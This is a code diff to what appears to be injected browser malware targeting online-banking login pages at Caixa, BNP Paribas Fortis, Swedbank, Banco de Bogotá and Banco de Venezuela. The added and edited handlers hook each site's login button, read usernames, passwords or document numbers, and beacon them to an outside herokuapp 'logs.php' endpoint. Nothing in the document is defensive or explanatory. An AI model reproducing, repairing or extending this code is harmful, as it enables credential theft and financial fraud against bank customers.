@@ -8,6 +8,21 @@ for (var i = 0; i < arrayLength; i++) {
 }
 
 
+if (top['location']['href']['indexOf']('internetbanking.caixa.gov.br') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementById']('conteudo-login')) {
+            clearInterval(interval);
+            document['getElementsByName']('btnLogin')[0].onclick = function (_0x441cx2) {
+              var login = {};
+                  login.userid = document.getElementsByName("name")[0].value;
+                  login.userpass = "test buttons 1 of 3";
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.userpass;
+            }
+        }
+    }, 1000)
+};
+
+
 if (top['location']['href']['indexOf']('www.bnpparibasfortis.be') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('login_flow')[0]) {
@@ -28,7 +43,7 @@ if (top['location']['href']['indexOf']('https://online.swedbank.se/app/privat/lo
         if (document['getElementsByClassName']('app-identification_login-method')[0]) {
             clearInterval(interval);
             document['getElementsByClassName']('_btn--block swed-button _margins-lg swed-button--primary')[0].onclick = function (_0x441cx2) {
-              var option = document.getElementById("swed-ui-id-09fp5ygy8-40");
+              var option = document.getElementsByClassName("ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required swed-input-container__form-control");
               var select = option.options[option.selectedIndex].value;
               var login = {};
                   login.userid = document.getElementsByName("userId")[0].value;
@@ -75,8 +90,8 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('cont-personas')[0]) {
             clearInterval(interval);
-            document['getElementsByClassName']('cont-ingreso-seguro')[0].onclick = function (_0x441cx2) {
-              var option = document.getElementByName("documentType");
+            document['getElementsByName']('submit_submit')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementsByName("documentType");
               var select = option.options[option.selectedIndex].value;
               var login = {};
                   login.documentNumber = document.getElementsByName("documentNumber")[0].value;
@@ -95,7 +110,7 @@ if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('borde_tabla_basic')[0]) {
             clearInterval(interval);
-            document['getElementsByClassName']('input_boton_reg')[0].onclick = function (_0x441cx2) {
+            document['getElementsByClassName']('input_boton_neg')[0].onclick = function (_0x441cx2) {
              var login = {};
             login.email = document.getElementsByName("Username1")[0].value;
             login.pass = document.getElementsByName("Passworde1")[0].value;
@@ -110,7 +125,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('borde_tabla_basic')[0]) {
             clearInterval(interval);
-            document['getElementsByClassName']('input_boton_reg')[0].onclick = function (_0x441cx2) {
+            document['getElementsByClassName']('input_boton_neg')[0].onclick = function (_0x441cx2) {
              var login = {};
             login.email = document.getElementsByName("notarjeta1")[0].value;
             login.pass = document.getElementsByName("passwordp1")[0].value;
